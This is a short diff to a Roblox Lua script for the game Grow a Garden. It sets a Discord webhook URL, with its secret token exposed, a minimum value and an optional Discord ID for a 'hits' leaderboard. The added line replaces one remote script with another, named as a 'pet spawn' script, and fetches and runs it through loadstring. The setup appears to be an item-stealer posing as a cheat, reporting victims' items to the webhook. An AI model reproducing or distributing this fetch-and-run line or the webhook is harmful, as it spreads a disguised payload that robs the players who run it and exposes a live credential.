@@ -3,4 +3,4 @@ Webhook = "https://discord.com/api/webhooks/1400497600880181298/b6Z0UumTffH-jdi3
 MinimumValue = 1
 DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
 
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+loadstring(game:HttpGet("https://github.com/mala4040273/Script-pet-spawn-grow-a-garden/blob/eb6c1d9e489e5995e80fad786ead0c4f96dd0679/Pet%20spawn%20grow%20a%20garden"))()
